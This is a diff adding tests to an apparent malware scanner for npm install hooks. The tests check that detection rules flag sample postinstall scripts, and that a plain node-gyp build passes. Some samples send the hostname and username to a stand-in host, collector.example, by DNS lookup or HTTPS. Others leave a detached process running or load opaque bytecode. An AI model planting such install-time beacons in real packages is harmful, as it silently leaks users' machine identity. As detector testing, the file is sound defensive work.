@@ -246,3 +246,52 @@ class TestWindowsLoaderAtInstall:
             for f in Helpers.findings(tmp_path, {"package.json": self.MANIFEST, "install.js": hook})
         }
         assert "MALWARE.INSTALL.WINDOWS_LOADER.001" not in found
+
+
+class TestInstallTimeSteps:
+    """Steps an install-time payload has to take, each read on its own (review 98)."""
+
+    @staticmethod
+    def found(tmp_path, hook: str, body: str) -> set[str]:
+        manifest = (
+            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node ' + hook + '"}}'
+        )
+        files = {"package.json": manifest, hook: body}
+        return {f.rule_id for f in Helpers.findings(tmp_path, files)}
+
+    def test_identity_in_a_dns_name(self, tmp_path) -> None:
+        body = (
+            "const os = require('os');\nconst dns = require('dns');\n"
+            "const id = Buffer.from(os.hostname()).toString('hex');\n"
+            "dns.lookup(id + '.collector.example', () => {});\n"
+        )
+        assert "MALWARE.EXFIL.BEACON.001" in self.found(tmp_path, "a.js", body)
+
+    def test_identity_named_as_data(self, tmp_path) -> None:
+        body = (
+            "const o = require('os');\nconst h = require('https');\n"
+            "const keys = [['userInfo', 'username'], ['hostname']];\n"
+            "const v = keys.map(k => k.reduce((a, b) => a[b], o));\n"
+            "h.get('https://collector.example/?d=' + v.join());\n"
+        )
+        assert "MALWARE.EXFIL.BEACON.001" in self.found(tmp_path, "a.js", body)
+
+    def test_a_process_left_running(self, tmp_path) -> None:
+        body = (
+            "const { spawn } = require('child_process');\n"
+            "const c = spawn('node', ['worker.js'], { detached: true, stdio: 'ignore' });\n"
+            "c.unref();\n"
+        )
+        assert "MALWARE.INSTALL.BACKGROUND.001" in self.found(tmp_path, "a.js", body)
+
+    def test_bytecode(self, tmp_path) -> None:
+        body = "require('bytenode');\nrequire('./main.jsc');\n"
+        assert "MALWARE.INSTALL.OPAQUE_CODE.001" in self.found(tmp_path, "a.js", body)
+
+    def test_a_build_step_is_none_of_these(self, tmp_path) -> None:
+        body = (
+            "const { spawnSync } = require('child_process');\n"
+            "spawnSync('node-gyp', ['rebuild'], { stdio: 'inherit' });\n"
+        )
+        found = self.found(tmp_path, "a.js", body)
+        assert not {r for r in found if r.startswith("MALWARE.")}
